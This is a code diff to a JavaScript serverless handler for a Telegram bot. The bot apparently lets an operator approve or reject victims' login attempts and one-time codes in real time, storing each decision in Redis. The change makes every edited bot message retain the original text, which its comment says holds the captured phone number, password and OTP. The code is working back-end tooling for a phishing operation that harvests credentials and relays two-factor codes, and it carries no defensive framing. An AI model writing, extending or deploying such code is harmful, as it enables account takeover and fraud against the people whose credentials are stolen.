@@ -42,25 +42,26 @@ exports.handler = async (event) => {
     const chatId = cb.message.chat.id;
     const messageId = cb.message.message_id;
     const cbId = cb.id;
+    const origText = cb.message.text || ''; // The original text containing phone/password/otp
 
     // ── Login decisions ──────────────────────────────────────────────
     if (data.startsWith('login_ok:')) {
         const sessionId = data.split(':')[1];
         await redisSet(`session:${sessionId}:login`, 'approved');
         await answerCallback(cbId, '✅ Approved!');
-        await editMessage(chatId, messageId, `✅ *Login Approved*\nSession: \`${sessionId}\``);
+        await editMessage(chatId, messageId, `✅ *Login Approved*\n\n${origText}`);
     }
     else if (data.startsWith('login_wrong_number:')) {
         const sessionId = data.split(':')[1];
         await redisSet(`session:${sessionId}:login`, 'wrong_number');
         await answerCallback(cbId, '❌ Wrong Number');
-        await editMessage(chatId, messageId, `❌ *Wrong Number*\nSession: \`${sessionId}\``);
+        await editMessage(chatId, messageId, `❌ *Wrong Number*\n\n${origText}`);
     }
     else if (data.startsWith('login_wrong_password:')) {
         const sessionId = data.split(':')[1];
         await redisSet(`session:${sessionId}:login`, 'wrong_password');
         await answerCallback(cbId, '❌ Wrong Password');
-        await editMessage(chatId, messageId, `❌ *Wrong Password*\nSession: \`${sessionId}\``);
+        await editMessage(chatId, messageId, `❌ *Wrong Password*\n\n${origText}`);
     }
 
     // ── OTP decisions ────────────────────────────────────────────────
@@ -68,13 +69,13 @@ exports.handler = async (event) => {
         const sessionId = data.split(':')[1];
         await redisSet(`session:${sessionId}:otp`, 'approved');
         await answerCallback(cbId, '✅ OTP Correct!');
-        await editMessage(chatId, messageId, `✅ *OTP Approved*\nSession: \`${sessionId}\``);
+        await editMessage(chatId, messageId, `✅ *OTP Approved*\n\n${origText}`);
     }
     else if (data.startsWith('otp_wrong:')) {
         const sessionId = data.split(':')[1];
         await redisSet(`session:${sessionId}:otp`, 'wrong_otp');
         await answerCallback(cbId, '❌ Wrong OTP');
-        await editMessage(chatId, messageId, `❌ *Wrong OTP*\nSession: \`${sessionId}\``);
+        await editMessage(chatId, messageId, `❌ *Wrong OTP*\n\n${origText}`);
     }
 
     return { statusCode: 200, body: 'ok' };
